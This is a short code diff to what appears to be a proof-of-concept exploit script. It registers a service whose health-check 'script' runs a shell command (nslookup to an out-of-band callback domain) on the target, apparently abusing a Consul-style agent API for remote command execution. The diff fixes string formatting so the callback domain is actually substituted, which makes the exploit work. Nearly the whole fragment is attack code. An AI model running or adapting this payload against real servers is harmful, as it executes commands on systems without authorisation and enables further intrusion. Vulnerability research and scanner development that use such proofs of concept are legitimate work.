@@ -47,11 +47,11 @@ def poc(url):
   "Address": "127.0.0.1",
   "Port": 80,
   "check": {
-    "script": "nslookup oob_domain",
+    "script": "nslookup {oob_domain}",
     "interval": "10s",
     "Timeout": "86400s"
   }
-}"""
+}""".format(oob_domain=oob_domain)
         headers = {}
         resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
